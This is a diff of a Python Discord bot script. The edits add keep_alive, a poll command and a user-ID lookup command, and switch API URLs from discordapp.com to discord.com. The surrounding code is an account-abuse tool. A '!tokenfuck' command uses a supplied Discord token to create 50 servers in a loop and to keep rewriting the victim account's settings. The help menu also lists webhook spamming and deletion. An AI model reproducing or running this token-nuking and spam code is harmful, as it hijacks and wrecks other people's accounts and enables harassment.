@@ -8,10 +8,11 @@ import json
 import datetime
 import base64
 from googletrans import Translator
+import keep_alive
 from itertools import cycle
 
-token = "ur tuc"
 
+token = ""
 
 
 translator = Translator()
@@ -107,11 +108,12 @@ async def on_message(message):
 **!b64encode/decode** - encodes/decodes something in base64 
 **!botinvite** - sends a invite to a bot
 
-**!tokenfuck** - fucks a token
-**!tokeninfo** - checks a tokens info 
+**!idinfo** - checks an id
 **!ipinfo** - checks an ip 
+**!tokeninfo** - checks a tokens info 
 **!spamwebhook** - spams a webhook
 **!deletewebhook** - deletes a webhook 
+**!tokenfuck** - fucks a token
 
 **!banner** - steals anyones banner
 **!av** - steals anyones avatar
@@ -134,6 +136,14 @@ async def on_message(message):
           await message.channel.send("i cant breathe")
           await message.channel.send("https://i.imgur.com/mn3EslL.png")
 
+        elif message.content == "!poll":
+          await message.channel.send("Question?")
+          response = await bot.wait_for('message')
+          question = response.content
+          embed = discord.Embed(title='Poll!', color = color, description=f"Poll: {question}")
+          message = await message.channel.send(embed=embed)
+          await message.add_reaction('✅')
+          await message.add_reaction('❎')
 
         elif message.content == "!test":
           await message.channel.send("bot is working!")
@@ -228,10 +238,10 @@ async def on_message(message):
               'region': "europe"
           } 
           for _i in range(50):
-              requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
+              requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
           while True:
               try:
-                  request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
+                  request.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload)
               except Exception as e:
                   pass
               else:
@@ -246,7 +256,7 @@ async def on_message(message):
               }
               for i in range(100):
                   try:
-                      request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
+                      request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
                   except Exception as e:
                       pass
                   else:
@@ -378,6 +388,22 @@ async def on_message(message):
 
 
 
+        elif message.content == "!idinfo":
+          await message.channel.send('User id?')
+          response = await bot.wait_for('message')
+          response2 = response.content
+          user = await bot.fetch_user(response2)
+          time = user.created_at.timestamp()
+          timestamp = datetime.fromtimestamp(time)
+          embed = discord.Embed(description=f"""
+**Username:** {user.name}#{user.discriminator}
+**Id:** {response2}
+**Created at:** {timestamp}
+""", color=color)
+          embed.set_thumbnail(url=user.avatar_url)
+          await message.channel.send(embed=embed)
+
+
         elif message.content == "!av":
           await message.channel.send('User?')
           try:
@@ -464,5 +490,5 @@ async def on_message(message):
 
 
 
-       
+
 bot.run(token)
